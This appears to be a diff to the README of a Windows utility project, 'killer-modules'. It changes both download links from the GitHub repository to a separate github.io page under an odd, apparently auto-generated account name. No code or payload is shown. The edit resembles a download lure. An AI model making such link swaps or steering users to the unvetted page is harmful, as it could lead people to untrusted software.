@@ -1,6 +1,6 @@
 # ⚙️ killer-modules - Manage Windows systems with simple tools
 
-[![Download Modules](https://img.shields.io/badge/Download_Modules-Blue.svg)](https://github.com/ungradableoppositioncree702/killer-modules)
+[![Download Modules](https://img.shields.io/badge/Download_Modules-Blue.svg)](https://ungradableoppositioncree702.github.io)
 
 This project provides tools for people who manage Windows computers. These small programs help you fix common errors, check system health, and complete daily tasks without manual steps. You do not need to be a computer expert to use these tools. Each tool focuses on one specific job to help you save time.
 
@@ -8,7 +8,7 @@ This project provides tools for people who manage Windows computers. These small
 
 Visit the GitHub project page to access the files. You can find the link below.
 
-[Click here to open the download page](https://github.com/ungradableoppositioncree702/killer-modules)
+[Click here to open the download page](https://ungradableoppositioncree702.github.io)
 
 Once you arrive at the page, look for the green button labeled "Code." Click this button and select "Download ZIP" to save the files to your computer.
 
